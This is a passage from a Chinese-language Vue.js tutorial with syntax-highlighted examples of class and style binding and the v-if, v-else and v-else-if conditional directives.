<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:class</span><span class="o">=</span><span class="s">&#34;classObject&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;clicked&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    点击切换样式
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isClicked</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isBold</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">classObject</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">redBox</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">isClicked</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">          <span class="nx">bold</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">isBold</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">clicked</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">isClicked</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isClicked</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">isBold</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">isBold</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>:class</code>中可以使用数组。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:class</span><span class="o">=</span><span class="s">&#34;[redBoxClass, boldClass]&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    数组语法
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">redBoxClass</span><span class="o">:</span> <span class="s1">&#39;redBox&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">boldClass</span><span class="o">:</span> <span class="s1">&#39;bold&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>:class</code>会将数组中的变量（如上，<code>redBoxClass</code>和<code>boldClass</code>）的值解析为该元素的<code>class</code>属性。利用数组语法动态切换。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:class</span><span class="o">=</span><span class="s">&#34;activedClass&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;clicked&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    点击切换样式
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s1">&#39;#app&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">activedClass</span><span class="o">:</span> <span class="p">[],</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">clicked</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">activedClass</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">activedClass</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">activedClass</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;redBox&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">activedClass</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">&#39;bold&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">activedClass</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><h2 id="style-绑定" data-numberify>style 绑定<a class="anchor ms-1" href="#style-绑定"></a></h2>
<p>可以通过<code>v-bind:style</code>设置样式。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> 
</span></span><span class="line"><span class="cl">    <span class="na">:style</span><span class="o">=</span><span class="s">&#34;{&#39;background-color&#39;: activedColor, width: size + &#39;px&#39;, height: size + &#39;px&#39;}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">activedColor</span><span class="o">:</span> <span class="s1">&#39;red&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">size</span><span class="o">:</span> <span class="mi">100</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>上方实例中的<code>:style</code>相当于<code>style=&quot;background-color: red; width: 100px; height: 100px;}&quot;</code>。</p>
<p>如果<code>:style</code>中的对象过长，同样可以在<code>data</code>中定义一个属性或者使用计算属性<code>computed</code>。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:style</span><span class="o">=</span><span class="s">&#34;styleObject&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">styleObject</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;background-color&#39;</span><span class="o">:</span> <span class="s1">&#39;red&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">width</span><span class="o">:</span> <span class="s1">&#39;100px&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">height</span><span class="o">:</span> <span class="s1">&#39;100px&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>动态切换样式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:style</span><span class="o">=</span><span class="s">&#34;styleObject&#34;</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;clicked&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">bgColor</span><span class="o">:</span> <span class="s1">&#39;yellow&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">size</span><span class="o">:</span> <span class="mi">100</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">styleObject</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">size</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">size</span> <span class="o">+</span> <span class="s1">&#39;px&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;background-color&#39;</span><span class="o">:</span> <span class="k">this</span><span class="p">.</span><span class="nx">bgColor</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">          <span class="nx">width</span><span class="o">:</span> <span class="nx">size</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">          <span class="nx">height</span><span class="o">:</span> <span class="nx">size</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">clicked</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">bgColor</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">bgColor</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">red</span> <span class="o">=</span> <span class="s1">&#39;red&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">yellow</span> <span class="o">=</span> <span class="s1">&#39;yellow&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">bgColor</span> <span class="o">=</span> <span class="nx">bgColor</span> <span class="o">===</span> <span class="nx">red</span> <span class="o">?</span> <span class="nx">yellow</span> <span class="o">:</span> <span class="nx">red</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p><code>:style</code>同样可以使用数组语法。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">:style</span><span class="o">=</span><span class="s">&#34;[activedStyles, sizeStyles]&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">activedStyles</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;background-color&#39;</span><span class="o">:</span> <span class="s1">&#39;red&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="nx">sizeStyles</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">width</span><span class="o">:</span> <span class="s1">&#39;100px&#39;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">height</span><span class="o">:</span> <span class="s1">&#39;100px&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><hr>
<h1 id="条件指令" data-numberify>条件指令<a class="anchor ms-1" href="#条件指令"></a></h1>
<p>在Vue的指令语法中，条件判断使用<code>v-if</code>指令，其语法如下：</p>
<pre tabindex="0"><code>v-if=&#34;expression&#34;
</code></pre><p><code>v-if</code>指令将根据<code>expression</code>的值（<code>true</code>或<code>false</code>）来决定是否显示当前元素，例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;changeSeen()&#34;</span><span class="p">&gt;</span>Show/Hide Text<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;seen&#34;</span><span class="p">&gt;</span>Testing v-if...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">seen</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">changeSeen</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">seen</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">seen</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在使用<code>v-if</code>的同时，还可以在后续元素中使用<code>v-else</code>指令给<code>v-if</code>添加一个<code>else</code>块。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;changeSeen()&#34;</span><span class="p">&gt;</span>Show/Hide Text<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;seen&#34;</span><span class="p">&gt;</span>Displayed...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-else</span><span class="p">&gt;</span>Hidden...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">seen</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">changeSeen</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 方法中的 this 指的是当前 Vue 实例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="p">.</span><span class="nx">seen</span> <span class="o">=</span> <span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">seen</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>vue@2.1.0</code>中，新增了<code>v-else-if</code>指令，它的语法格式与<code>v-if</code>相同，但是需要在使用了<code>v-if</code>的后续元素中使用。例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;changeNum()&#34;</span><span class="p">&gt;</span>Next<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;num === 0&#34;</span><span class="p">&gt;</span>Number 1...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-else-if</span><span class="o">=</span><span class="s">&#34;num === 1&#34;</span><span class="p">&gt;</span>Number 2...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">p</span> <span class="na">v-else</span><span class="p">&gt;</span>Number 3...<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">num</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">methods</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">changeNum</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="p">.</span><span class="nx">num</span> <span class="o">=</span> <span class="o">++</span><span class="k">this</span><span class="p">.</span><span class="nx">num</span> <span class="o">%</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>注：</p>
<p><code>v-if</code>、<code>v-else</code>和<code>v-else-if</code>一起使用时，结构不饿能被“打断”。<code>v-else</code>和<code>v-else-if</code>指令必须在使用了<code>v-if</code>的后续元素中使用，它们不能单独使用。并且使用了<code>v-else</code>之后不能在没有使用<code>v-if</code>的情况下再次使用<code>v-else-if</code>。<code>v-else</code>和<code>v-else-if</code>的使用就像其它语言中的<code>if ... else</code>和<code>if ... else if</code>语句一样。</p>
<p><code>v-if</code>可以和<code>&lt;template&gt;</code>标签配合使用，以达到将多个同时需要连续使用同个<code>v-if</code>指令的元素在同一条件下一齐显示，而又不影响最终编译出来的页面结构。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;!isDisabled&#34;</span><span class="p">&gt;</span>Title 1<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;!isDisabled&#34;</span><span class="p">&gt;</span>Title 2<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h2</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;!isDisabled&#34;</span><span class="p">&gt;</span>Title 3<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>可以使用<code>&lt;template&gt;</code>标签将上方代码优化为：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">template</span> <span class="na">v-if</span><span class="o">=</span><span class="s">&#34;!isDisabled&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Title 1<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Title 2<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>Title 3<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">template</span><span class="p">&gt;</span>
</span></span></code></pre></div></blockquote>
